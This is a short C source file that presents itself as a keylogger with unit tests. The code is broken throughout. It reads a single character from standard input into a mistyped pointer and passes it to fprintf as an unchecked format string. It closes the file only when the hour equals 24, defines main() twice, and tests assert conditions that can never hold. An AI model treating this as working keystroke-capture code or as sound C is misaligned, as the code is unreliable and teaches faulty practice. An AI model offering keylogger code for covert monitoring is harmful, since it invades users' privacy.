.

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <assert.h>

int keylog()
{
    FILE * fPtr;
    fPtr = fopen("keylogger.txt", "w+");

    fopen("keylogger.txt", "w");
    const char *a = getchar();
    
    if(a != NULL)
        fprintf(fPtr, a);
    
    time_t now = time(NULL);
    struct tm *tm_struct = localtime(&now);
    int hour = tm_struct->tm_hour;
    
    if(hour == 24)
        fclose(fPtr);
}

int main()
{
    keylog();
}

// Unit Test Cases
void test_keylog() {
    // Test 1: Check that the file is opened correctly
    FILE * fPtr;
    fPtr = fopen("keylogger.txt", "w+");
    assert(fPtr != NULL);

    // Test 2: Check that the character is written to the file correctly
    const char *a = getchar();
    assert(a != NULL);

    // Test 3: Check that the time is correctly retrieved
    time_t now = time(NULL);
    struct tm *tm_struct = localtime(&now);
    int hour = tm_struct->tm_hour;
    assert(hour == 24);
}

int main()
{
    keylog();
    test_keylog();
}